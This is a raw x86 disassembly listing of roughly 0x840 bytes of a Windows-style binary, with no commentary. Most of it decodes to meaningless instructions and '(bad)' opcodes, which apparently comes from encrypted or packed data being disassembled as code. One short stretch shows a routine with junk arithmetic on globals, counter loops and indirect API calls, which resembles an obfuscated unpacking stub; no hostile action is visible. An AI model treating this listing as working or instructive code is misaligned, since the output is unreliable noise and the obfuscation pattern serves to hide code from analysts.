  4057e5:	(bad)  
  4057e6:	dec    edi
  4057e7:	fdivp  st(4),st
  4057e9:	repnz int 0x7a
  4057ec:	mov    eax,0x4b525b74
  4057f1:	pop    eax
  4057f2:	loop   0x4057de
  4057f4:	adc    al,0x66
  4057f6:	inc    edx
  4057f7:	mov    eax,ds:0x68c21cb5
  4057fc:	iret   
  4057fd:	(bad)  
  4057fe:	bound  ebx,QWORD PTR [ebx-0x46]
  405801:	in     al,0x51
  405803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405804:	xchg   ecx,eax
  405805:	aad    0xea
  405807:	mov    esp,0xdf5cfcd4
  40580c:	xor    BYTE PTR [esi+edi*2+0x55],0x0
  405811:	gs xchg esp,eax
  405813:	ret    
  405814:	mov    esp,0xa465fee0
  405819:	addr16 xchg edx,eax
  40581b:	sbb    eax,0x943f4e00
  405820:	push   esp
  405821:	adc    BYTE PTR [esi+0x11],al
  405824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405825:	lods   al,BYTE PTR ds:[esi]
  405826:	jg     0x405808
  405828:	push   0x73
  40582a:	push   0xc74e825c
  40582f:	aam    0xad
  405831:	inc    ebx
  405832:	test   BYTE PTR [esi-0x4],ah
  405835:	sub    DWORD PTR [edi+0xb],edx
  405838:	and    dh,BYTE PTR [edi]
  40583a:	pushf  
  40583b:	ins    BYTE PTR es:[edi],dx
  40583c:	and    al,0x6c
  40583e:	push   es
  40583f:	and    BYTE PTR [ecx+ebp*1],ah
  405842:	xchg   esp,eax
  405843:	fcom   QWORD PTR [edx-0x35]
  405846:	int3   
  405847:	jne    0x4057f1
  405849:	dec    esi
  40584a:	sti    
  40584b:	jmp    0x5a35df76
  405850:	(bad)  
  405851:	jne    0x405836
  405853:	lock imul edx,DWORD PTR [esp+ebx*1-0x6a1147e9],0xc261e834
  40585f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405860:	popf   
  405861:	mov    dh,0x3b
  405863:	add    al,0xda
  405865:	inc    DWORD PTR [ecx+0x54e4916]
  40586b:	fs adc al,0xcd
  40586e:	test   DWORD PTR [ebp-0x7d262a69],ebx
  405874:	adc    BYTE PTR [ebx+ebp*4],ah
  405877:	ja     0x4058e9
  405879:	inc    ecx
  40587a:	inc    edx
  40587b:	mov    ds:0x288c6aa1,eax
  405880:	sub    DWORD PTR [esi+0x4b00e9ec],edx
  405886:	cdq    
  405887:	mov    bh,0x36
  405889:	mov    bl,0x7a
  40588b:	pop    ebp
  40588c:	dec    esp
  40588d:	jnp    0x40586a
  40588f:	inc    ecx
  405890:	clc    
  405891:	ins    BYTE PTR es:[edi],dx
  405892:	ret    
  405893:	data16 or al,0x40
  405896:	fbld   TBYTE PTR [ecx-0x71]
  405899:	mov    BYTE PTR [edx-0x54d330f7],0xe5
  4058a0:	std    
  4058a1:	mov    BYTE PTR [ebx+0x6088d9e3],0xef
  4058a8:	retf   
  4058a9:	push   edx
  4058aa:	xchg   esp,eax
  4058ab:	mov    ch,BYTE PTR [esi+0x54582660]
  4058b1:	pop    eax
  4058b2:	or     DWORD PTR [edx+0x35],esi
  4058b5:	sahf   
  4058b6:	or     dh,BYTE PTR [ecx]
  4058b8:	jle    0x405937
  4058ba:	sbb    esp,esp
  4058bc:	mov    ch,0xb4
  4058be:	pushf  
  4058bf:	clc    
  4058c0:	call   0x8d94:0xe4896fe1
  4058c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c8:	sbb    ebp,DWORD PTR [edx+ebx*2-0x5fdce559]
  4058cf:	or     al,0x7e
  4058d1:	nop
  4058d2:	push   ebp
  4058d3:	les    ebx,FWORD PTR [esi]
  4058d5:	cs dec ebp
  4058d7:	loopne 0x4058fd
  4058d9:	mov    ebp,0xbc13ea9a
  4058de:	pop    DWORD PTR [eax]
  4058e0:	or     al,0xf6
  4058e2:	dec    ebp
  4058e3:	sbb    dl,bh
  4058e5:	lock call 0x693c6bba
  4058eb:	xor    eax,0x40581c7b
  4058f0:	mov    eax,ds:0x3a86b9c4
  4058f5:	inc    ebp
  4058f6:	popa   
  4058f7:	add    eax,0x4fe611fe
  4058fc:	mov    ecx,DWORD PTR [ecx+0x2]
  4058ff:	mov    ecx,0x1d99430b
  405904:	fidivr DWORD PTR [edx+0x78]
  405907:	add    BYTE PTR [ecx+0x28],al
  40590a:	sub    eax,0x99d55ff2
  40590f:	push   ss
  405910:	popa   
  405911:	cmp    esp,ebx
  405913:	bound  edi,QWORD PTR [ebx-0x19]
  405916:	rol    edi,0x9a
  405919:	outs   dx,DWORD PTR ds:[esi]
  40591a:	sti    
  40591b:	lahf   
  40591c:	mov    al,ds:0x8d901cb6
  405921:	call   0xd85ea90b
  405926:	mov    ebp,0x55fde451
  40592b:	ja     0x4058ea
  40592d:	sbb    esi,0xe12296eb
  405933:	shl    DWORD PTR [ebp+0x107d5958],cl
  405939:	jmp    0x1e2d:0xea2c4e47
  405940:	adc    BYTE PTR [esp+edx*8],cl
  405943:	(bad)  
  405944:	jnp    0x4058e9
  405946:	mov    DWORD PTR [edi-0x4e],esp
  405949:	cmc    
  40594a:	xchg   esi,eax
  40594b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40594c:	lds    edi,FWORD PTR [ecx+0x3ed90581]
  405952:	sub    ecx,DWORD PTR [esi]
  405954:	(bad)  
  405955:	push   ebx
  405956:	popf   
  405957:	xchg   ebp,eax
  405958:	cmp    eax,0xcbf6d2fc
  40595d:	aas    
  40595e:	inc    ebp
  40595f:	mov    dh,0x54
  405961:	ds mov edi,0x7e26999f
  405967:	(bad)  
  405968:	push   ecx
  405969:	ror    DWORD PTR [edi],1
  40596b:	call   0xb182f07e
  405970:	mov    ch,0xb3
  405972:	sub    cl,BYTE PTR [ecx]
  405974:	xor    DWORD PTR [esi-0xa21e83d],ebp
  40597a:	mov    edi,0xa1e9e43
  40597f:	(bad)  
  405980:	jl     0x405980
  405982:	inc    edi
  405983:	daa    
  405984:	jne    0x405a02
  405986:	mov    bh,0x48
  405988:	out    dx,eax
  405989:	bound  esi,QWORD PTR [ecx+0x2d74fe48]
  40598f:	int    0xde
  405991:	loop   0x40591a
  405993:	shr    DWORD PTR [ecx+ebx*2-0x3e],0x85
  405998:	fisttp WORD PTR [ebp-0x38]
  40599b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40599c:	inc    edx
  40599d:	xor    BYTE PTR [eax+0x48ffb584],0xa1
  4059a4:	jmp    0x8282f31f
  4059a9:	mov    edx,0x20281bdc
  4059ae:	addr16 sub eax,0x55775d06
  4059b4:	xor    eax,0x223e2231
  4059b9:	ins    BYTE PTR es:[edi],dx
  4059ba:	jns    0x405a1c
  4059bc:	mov    esi,0x4377fe9c
  4059c1:	mov    cl,0xf6
  4059c3:	sub    dl,bl
  4059c5:	mov    dl,BYTE PTR [esp+esi*4]
  4059c8:	jmp    0x773e:0xf1b6e90c
  4059cf:	stos   BYTE PTR es:[edi],al
  4059d0:	(bad)  
  4059d1:	jecxz  0x4059e8
  4059d3:	pop    ebx
  4059d4:	jecxz  0x405a24
  4059d6:	cmp    DWORD PTR [ebp+0x21],esi
  4059d9:	stos   BYTE PTR es:[edi],al
  4059da:	cwde   
  4059db:	inc    ebx
  4059dc:	iret   
  4059dd:	dec    edi
  4059de:	jl     0x405a1a
  4059e0:	mov    bl,0x6e
  4059e2:	aad    0x41
  4059e4:	rol    edx,0xd0
  4059e7:	psllq  mm5,QWORD PTR [esi]
  4059ea:	cmp    al,0x8c
  4059ec:	ss pushw 0x4ef3
  4059f1:	mov    ebx,0xa73fddc7
  4059f6:	(bad)  
  4059f7:	fst    QWORD PTR [ebp+0x42b44523]
  4059fd:	sbb    esi,edx
  4059ff:	(bad)  [ebp+0x5e]
  405a02:	xor    al,0xa1
  405a04:	fadd   st(7),st
  405a06:	mov    edi,0x6ba6acac
  405a0b:	mov    al,0x3b
  405a0d:	sti    
  405a0e:	shl    DWORD PTR [esi+0x303c3637],1
  405a14:	aaa    
  405a15:	adc    BYTE PTR [edi+eax*1],0x82
  405a19:	adc    dl,BYTE PTR [esi]
  405a1b:	jmp    esi
  405a1d:	(bad)  
  405a1e:	pop    ebp
  405a1f:	adc    edx,DWORD PTR [esi+0x5]
  405a22:	jp     0x4059e8
  405a24:	push   edi
  405a25:	or     ebx,edi
  405a27:	or     edi,DWORD PTR [eax+edx*2]
  405a2a:	jg     0x4059d1
  405a2c:	daa    
  405a2d:	int    0x6c
  405a2f:	mov    ss,WORD PTR [ebx]
  405a31:	stc    
  405a32:	(bad)  
  405a33:	lock sub dh,BYTE PTR [ebp+0x41]
  405a37:	test   al,0xd2
  405a39:	or     DWORD PTR [esi],esi
  405a3b:	xor    DWORD PTR [edx],esp
  405a3d:	mov    cl,BYTE PTR [eax+0x12dc61e4]
  405a43:	add    DWORD PTR [esp+edi*2-0xbac14ea],edx
  405a4a:	or     eax,DWORD PTR [ecx+ebp*2+0x6a]
  405a4e:	cwde   
  405a4f:	fisttp QWORD PTR [edi+0x17202700]
  405a55:	xor    DWORD PTR [ebp+eiz*4+0xdc3a5e],esi
  405a5c:	mov    dl,0x0
  405a5e:	(bad)  
  405a5f:	jp     0x405a1e
  405a61:	shr    ch,cl
  405a63:	push   ds
  405a64:	repz cmp esp,DWORD PTR [edi+0x798b0ba1]
  405a6b:	fnstsw WORD PTR [edi+esi*2-0x5fff77c1]
  405a72:	fwait
  405a73:	out    dx,eax
  405a74:	not    BYTE PTR [edi-0x78]
  405a77:	hlt    
  405a78:	mov    ch,0x9e
  405a7a:	push   edx
  405a7b:	inc    esp
  405a7c:	outs   dx,DWORD PTR ds:[esi]
  405a7d:	shr    DWORD PTR [edx-0x3a74e67],1
  405a83:	repnz mov bl,0x2e
  405a86:	lock test BYTE PTR [eax],bl
  405a89:	ret    0x6071
  405a8c:	call   0xe1:0x5e8801b5
  405a93:	and    ecx,DWORD PTR [ebp+0x18]
  405a96:	loopne 0x405ae2
  405a98:	outs   dx,DWORD PTR ds:[esi]
  405a99:	dec    ebx
  405a9a:	xor    al,0x8c
  405a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a9d:	sti    
  405a9e:	add    al,0xc4
  405aa0:	lock sti 
  405aa2:	jp     0x405b03
  405aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa5:	push   ds
  405aa6:	sub    BYTE PTR [ebp-0x64],bh
  405aa9:	ret    
  405aaa:	shl    DWORD PTR [edi],1
  405aac:	mov    dh,0x92
  405aae:	push   ebx
  405aaf:	fld    TBYTE PTR [ecx+0x53466eb9]
  405ab5:	cdq    
  405ab6:	pop    ebp
  405ab7:	mov    ds:0xdbc0c79e,eax
  405abc:	mov    cl,BYTE PTR [edi]
  405abe:	ja     0x405a7f
  405ac0:	int3   
  405ac1:	xchg   ebp,eax
  405ac2:	add    al,0x8a
  405ac4:	adc    BYTE PTR [ecx],0x25
  405ac7:	add    dh,BYTE PTR [ebx+0x1d]
  405aca:	jle    0x405a7f
  405acc:	int3   
  405acd:	mov    al,ds:0x740278f6
  405ad2:	xchg   esp,eax
  405ad3:	xchg   ecx,eax
  405ad4:	call   FWORD PTR [edx-0x5652e681]
  405ada:	mov    ds:0x21beb3b5,al
  405adf:	push   ecx
  405ae0:	or     BYTE PTR [ecx],dh
  405ae2:	cmp    al,0xef
  405ae4:	in     al,0x4c
  405ae6:	inc    edx
  405ae7:	(bad)  
  405ae8:	adc    esp,esi
  405aea:	test   DWORD PTR [ecx+0x6bd0de8b],esp
  405af0:	dec    ecx
  405af1:	sar    DWORD PTR [ebp-0x3358a5b],0xfa
  405af8:	push   esi
  405af9:	fxch   st(1)
  405afb:	shl    cl,0x65
  405afe:	scas   al,BYTE PTR es:[edi]
  405aff:	pop    esp
  405b00:	xchg   ebx,eax
  405b01:	adc    BYTE PTR [edx],0x30
  405b04:	call   0x8c4177a1
  405b09:	scas   al,BYTE PTR es:[edi]
  405b0a:	stos   DWORD PTR es:[edi],eax
  405b0b:	outs   dx,BYTE PTR ds:[esi]
  405b0c:	lahf   
  405b0d:	sti    
  405b0e:	jmp    0xec476dea
  405b13:	pminsw mm0,mm2
  405b16:	sbb    esi,eax
  405b18:	pop    es
  405b19:	aas    
  405b1a:	lahf   
  405b1b:	jb     0x405aaf
  405b1d:	call   0x3742b3e
  405b22:	xchg   BYTE PTR [edi-0x9a9d98b],ch
  405b28:	mov    esp,0x468347dd
  405b2d:	cmp    BYTE PTR [ecx],al
  405b2f:	dec    edi
  405b30:	jecxz  0x405b6e
  405b32:	jl     0x405ad9
  405b34:	(bad)  
  405b35:	retf   
  405b36:	aad    0xb9
  405b38:	adc    DWORD PTR [esi-0x6a],esp
  405b3b:	push   es
  405b3c:	(bad)  
  405b3d:	in     eax,dx
  405b3e:	xor    al,0x29
  405b40:	cmp    DWORD PTR [edi],ecx
  405b42:	repz fimul WORD PTR [edx+0x5a184461]
  405b49:	jle    0x405b1a
  405b4b:	mov    al,0xea
  405b4d:	sbb    DWORD PTR [edx-0x11514c5f],esi
  405b53:	ret    
  405b54:	ret    
  405b55:	lods   eax,DWORD PTR ds:[esi]
  405b56:	les    esp,FWORD PTR [edx+eax*2-0x5369dac0]
  405b5d:	inc    ebx
  405b5e:	sbb    al,0xa8
  405b60:	cmovo  esp,ebx
  405b63:	inc    edi
  405b64:	push   eax
  405b65:	adc    edi,esp
  405b67:	in     eax,0x7d
  405b69:	mov    bh,0xe3
  405b6b:	mov    al,ds:0x53bfa6c1
  405b70:	pop    edi
  405b71:	mov    ebx,0x2d9b37a4
  405b76:	mov    bl,0x69
  405b78:	cmp    eax,esp
  405b7a:	pop    eax
  405b7b:	(bad)  
  405b7c:	pop    ebp
  405b7d:	inc    ebx
  405b7e:	fsubr  DWORD PTR [ebx]
  405b80:	dec    esi
  405b81:	xor    ebx,DWORD PTR [ebp+ebp*8+0x5]
  405b85:	sbb    al,0x9e
  405b87:	mov    ds:0x8c5f3736,eax
  405b8c:	xlat   BYTE PTR ds:[ebx]
  405b8d:	cmp    bl,al
  405b8f:	mov    ebx,0x3b77e487
  405b94:	or     al,0xf1
  405b96:	adc    eax,eax
  405b98:	lods   al,BYTE PTR ds:[esi]
  405b99:	mov    DWORD PTR [eax-0x571209a5],esi
  405b9f:	adc    eax,0x8f094812
  405ba4:	enter  0xd1af,0xf3
  405ba8:	mov    dh,0x31
  405baa:	add    DWORD PTR [edi-0x54],ecx
  405bad:	push   esp
  405bae:	stos   BYTE PTR es:[edi],al
  405baf:	or     cl,0x31
  405bb2:	mov    bh,BYTE PTR [ebx+0x8]
  405bb5:	jmp    0x86e4:0xf8eca8d7
  405bbc:	pusha  
  405bbd:	pop    esp
  405bbe:	jo     0x405b4b
  405bc0:	mov    ebp,0xa0c6b319
  405bc5:	xor    DWORD PTR [eax],0xffffff83
  405bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bc9:	sub    eax,DWORD PTR [edx]
  405bcb:	adc    DWORD PTR [ebp-0x15453289],edx
  405bd1:	cmp    eax,0xf43363c7
  405bd6:	cmp    DWORD PTR [esi-0x7],esi
  405bd9:	stos   DWORD PTR es:[edi],eax
  405bda:	dec    ebx
  405bdb:	daa    
  405bdc:	ds xchg ebp,eax
  405bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bdf:	sub    al,0xde
  405be1:	test   eax,0xe9aa81f7
  405be6:	fidiv  DWORD PTR ds:0x3e0767c5
  405bec:	mov    DWORD PTR [ebp+0x2e01d5c8],ebx
  405bf2:	xchg   edx,eax
  405bf3:	inc    ebp
  405bf4:	push   edi
  405bf5:	ds jp  0x405c52
  405bf8:	adc    BYTE PTR [edi],bl
  405bfa:	add    BYTE PTR [ecx-0x5dde5c37],dh
  405c00:	push   edx
  405c01:	push   ecx
  405c02:	jle    0x405ba6
  405c04:	fs dec edx
  405c06:	sub    DWORD PTR [ebx-0x12],ecx
  405c09:	push   ds
  405c0a:	xchg   esp,eax
  405c0b:	loope  0x405bde
  405c0d:	jne    0x405bd8
  405c0f:	test   eax,0xc6fafcae
  405c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c15:	aam    0x9f
  405c17:	cmp    ecx,esi
  405c19:	or     DWORD PTR [ecx+edx*4],edi
  405c1c:	stos   BYTE PTR es:[edi],al
  405c1d:	inc    edi
  405c1e:	sub    DWORD PTR [ebx],ecx
  405c20:	push   cs
  405c21:	mov    ebx,0x682f8b71
  405c26:	cmp    eax,0x9a6c5f1
  405c2b:	and    DWORD PTR [ecx+ebx*8+0x35ec7c25],ecx
  405c32:	outs   dx,DWORD PTR ds:[esi]
  405c33:	jp     0x405c35
  405c35:	imul   ecx,DWORD PTR ds:0x2f88b91b,0xffffff83
  405c3c:	mov    al,0x94
  405c3e:	int    0xbb
  405c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c41:	push   eax
  405c42:	lahf   
  405c43:	retf   0xb88e
  405c46:	cmp    al,0x63
  405c48:	lods   eax,DWORD PTR ds:[esi]
  405c49:	xchg   ebp,eax
  405c4a:	fadd   QWORD PTR [edi-0x4347dd99]
  405c50:	jbe    0x405c24
  405c52:	push   ebx
  405c53:	cli    
  405c54:	mov    BYTE PTR [ecx],dh
  405c56:	pushf  
  405c57:	lahf   
  405c58:	int    0xc2
  405c5a:	xchg   ebp,eax
  405c5b:	push   esp
  405c5c:	push   eax
  405c5d:	cli    
  405c5e:	out    dx,al
  405c5f:	push   esi
  405c60:	xchg   ebp,eax
  405c61:	iret   
  405c62:	sub    al,0x39
  405c64:	cmp    BYTE PTR gs:[ebp-0x14],ch
  405c68:	jns    0x405ce4
  405c6a:	scas   al,BYTE PTR es:[edi]
  405c6b:	pop    edi
  405c6c:	pop    esi
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423533
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx+0x12d4e35a]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  edi,QWORD PTR ds:0x6a319540
  405e16:	jl     0x405e0b
  405e18:	in     eax,0xba
  405e1a:	sbb    DWORD PTR [esi-0x5368a0f1],ebp
  405e20:	adc    ch,BYTE PTR [edx]
  405e22:	packuswb xmm0,xmm3
  405e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e27:	ja     0x405e91
  405e29:	mov    dl,0x33
  405e2b:	sub    eax,0x87765ca2
  405e30:	and    BYTE PTR [edi-0x38ee541f],cl
  405e36:	in     al,0xc2
  405e38:	mov    ecx,esp
  405e3a:	(bad)  
  405e3b:	dec    ebp
  405e3c:	and    bl,BYTE PTR [eax+0x25]
  405e3f:	fcom   QWORD PTR [ecx-0x61]
  405e42:	xor    eax,DWORD PTR [ebx+0x65]
  405e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e46:	int    0xc4
  405e48:	mov    ch,0xda
  405e4a:	dec    ebx
  405e4b:	or     BYTE PTR [edi],0x8f
  405e4e:	(bad)  
  405e4f:	movhps xmm4,QWORD PTR [edx+0x29f4765e]
  405e56:	mov    ds:0xb47979d,eax
  405e5b:	xor    BYTE PTR [eax-0x76],bh
  405e5e:	push   ds
  405e5f:	ret    0x8606
  405e62:	xor    al,BYTE PTR [ebx-0x29]
  405e65:	es inc edi
  405e67:	push   edx
  405e68:	cmp    eax,esi
  405e6a:	add    al,0x61
  405e6c:	dec    ebx
  405e6d:	inc    edx
  405e6e:	loop   0x405ee7
  405e70:	jmp    0x9dd6:0xffe399c8
  405e77:	push   ebp
  405e78:	retf   
  405e79:	call   edi
  405e7b:	clc    
  405e7c:	mov    dl,BYTE PTR [eax-0x52]
  405e7f:	aad    0x71
  405e81:	pop    ss
  405e82:	rcr    BYTE PTR [eax],1
  405e84:	dec    esi
  405e85:	xor    al,0x98
  405e87:	dec    DWORD PTR [edx-0x29faef47]
  405e8d:	add    eax,DWORD PTR [ebx]
  405e8f:	shl    DWORD PTR [edi+0x59],cl
  405e92:	and    eax,0xcc30c9f3
  405e97:	jbe    0x405e8e
  405e99:	lods   ax,WORD PTR ds:[esi]
  405e9b:	xchg   edi,eax
  405e9c:	(bad)  
  405e9d:	jnp    0x405eb6
  405e9f:	sub    eax,0x6609dfbd
  405ea4:	or     ch,cl
  405ea6:	fninit 
  405ea8:	cmp    eax,0xcdeee685
  405ead:	(bad)  
  405eae:	cmp    al,0x4a
  405eb0:	cmp    eax,DWORD PTR [edi-0x37]
  405eb3:	mov    dh,0x96
  405eb5:	das    
  405eb6:	sbb    eax,0xeeb005be
  405ebb:	mov    ss,WORD PTR [ebp-0x3fff1611]
  405ec1:	xchg   esi,eax
  405ec2:	xchg   ebp,eax
  405ec3:	xchg   edi,eax
  405ec4:	sbb    ah,BYTE PTR [esi+0xe35e719]
  405eca:	call   ebx
  405ecc:	push   ecx
  405ecd:	inc    eax
  405ece:	imul   ecx,DWORD PTR [esi+edx*8-0x5a],0xffffffd4
  405ed3:	inc    BYTE PTR [ecx-0x37]
  405ed6:	dec    esi
  405ed7:	mov    al,0x39
  405ed9:	cld    
  405eda:	mov    edx,0x57f62bcf
  405edf:	add    dh,ch
  405ee1:	scas   al,BYTE PTR es:[edi]
  405ee2:	lea    edx,[ebx-0x42180c3a]
  405ee8:	and    esp,DWORD PTR [ebx-0x1e9d3cab]
  405eee:	xor    eax,0x3ecaf319
  405ef3:	push   eax
  405ef4:	mov    ds:0x129971f6,eax
  405ef9:	sub    ah,BYTE PTR [edx+0x49be7871]
  405eff:	pop    esi
  405f00:	ja     0x405f73
  405f02:	pop    esi
  405f03:	push   ebx
  405f04:	out    0x78,al
  405f06:	stc    
  405f07:	pop    edi
  405f08:	dec    edx
  405f09:	lock xchg esp,eax
  405f0b:	xlat   BYTE PTR ds:[ebx]
  405f0c:	xchg   esi,eax
  405f0d:	in     al,dx
  405f0e:	xchg   edi,eax
  405f0f:	xor    eax,0xc368f627
  405f14:	sbb    ch,cl
  405f16:	sar    DWORD PTR [ecx+0x47],1
  405f19:	ins    BYTE PTR es:[edi],dx
  405f1a:	sbb    eax,0xc9e913fa
  405f1f:	je     0x405f65
  405f21:	out    dx,al
  405f22:	sahf   
  405f23:	stos   BYTE PTR es:[edi],al
  405f24:	out    0x1f,eax
  405f26:	push   eax
  405f27:	xor    BYTE PTR [ecx],dh
  405f29:	inc    esi
  405f2a:	and    al,0xe3
  405f2c:	aad    0x7f
  405f2e:	(bad)  
  405f2f:	pop    ecx
  405f30:	push   edi
  405f31:	jne    0x405f19
  405f33:	add    al,0xc9
  405f35:	or     al,0x91
  405f37:	pushf  
  405f38:	addr16 cdq 
  405f3a:	xchg   edx,eax
  405f3b:	push   edx
  405f3c:	arpl   cx,si
  405f3e:	or     al,0x26
  405f40:	xchg   ecx,eax
  405f41:	xchg   dh,ch
  405f43:	leave  
  405f44:	nop
  405f45:	and    eax,DWORD PTR [eax]
  405f47:	(bad)  [edx]
  405f49:	jo     0x405f6b
  405f4b:	push   cs
  405f4c:	jae    0x405ef4
  405f4e:	xlat   BYTE PTR ds:[ebx]
  405f4f:	and    eax,0x4c17ff51
  405f54:	imul   edi,DWORD PTR [ebx],0xffffff98
  405f57:	cmp    DWORD PTR [edi],ecx
  405f59:	mov    WORD PTR es:[edi-0x7c0aa0c],?
  405f60:	clc    
  405f61:	stos   BYTE PTR es:[edi],al
  405f62:	xor    al,0xea
  405f64:	add    eax,0xb540c5fc
  405f69:	push   eax
  405f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6b:	lods   eax,DWORD PTR ds:[esi]
  405f6c:	call   0xaa7a:0xa3462784
  405f73:	pop    ds
  405f74:	cwde   
  405f75:	scas   al,BYTE PTR es:[edi]
  405f76:	mov    al,ds:0xa739e25a
  405f7b:	jge    0x405fed
  405f7d:	fidivr WORD PTR [ebp-0xd]
  405f80:	add    DWORD PTR es:[esi+0x5d],0xf0134ca5
  405f88:	out    0xfb,al
  405f8a:	dec    edx
  405f8b:	sahf   
  405f8c:	xlat   BYTE PTR ds:[ebx]
  405f8d:	mov    bh,0x13
  405f8f:	push   edi
  405f90:	(bad)  
  405f91:	les    dx,DWORD PTR [ebx+0x3e4b8a00]
  405f98:	call   0x20db:0xf3611b0e
  405f9f:	sub    al,0xd1
  405fa1:	cmp    al,0x49
  405fa3:	(bad)  
  405fa4:	out    dx,al
  405fa5:	cdq    
  405fa6:	mov    esp,0xd0527e91
  405fab:	scas   al,BYTE PTR es:[edi]
  405fac:	dec    esp
  405fad:	fstp   QWORD PTR [edx+0x61ee36eb]
  405fb3:	fisubr DWORD PTR [edx+0x5]
  405fb6:	xchg   esi,eax
  405fb7:	out    0xdb,al
  405fb9:	(bad)  [ecx-0x47215377]
  405fbf:	hlt    
  405fc0:	rcl    BYTE PTR [esi+0x28],cl
  405fc3:	jb     0x406032
  405fc5:	loop   0x405fa1
  405fc7:	cli    
  405fc8:	pop    ebp
  405fc9:	push   0x5f
  405fcb:	xchg   ebx,eax
  405fcc:	arpl   WORD PTR [ecx+0x2e],sp
  405fcf:	ret    
  405fd0:	mov    WORD PTR [eax-0xd8c8396],es
  405fd6:	adc    al,0xa7
  405fd8:	sbb    eax,edi
  405fda:	adc    ebp,DWORD PTR [eax+eiz*8+0x45861ad5]
  405fe1:	mov    edi,0x37d6e971
  405fe6:	aad    0xa4
  405fe8:	mov    eax,DWORD PTR [edi]
  405fea:	(bad)  
  405fec:	push   edi
  405fed:	ins    BYTE PTR es:[edi],dx
  405fee:	lock lahf 
  405ff0:	and    ebx,ebx
  405ff2:	nop
  405ff3:	(bad)  
  405ff4:	out    dx,eax
  405ff5:	xlat   BYTE PTR ds:[ebx]
  405ff6:	xchg   ecx,eax
  405ff7:	ins    BYTE PTR es:[di],dx
  405ff9:	mov    al,ds:0xa7b8e28c
  405ffe:	lock mov edx,0x53cb9f59
  406004:	fwait
  406005:	add    eax,0xb33fbd07
  40600a:	and    BYTE PTR [eax+0x74ed8473],dl
  406010:	(bad)  
  406012:	je     0x40607c
  406014:	jns    0x406046
  406016:	retf   
  406017:	ret    0x7650
  40601a:	in     eax,0xc5
  40601c:	cmc    
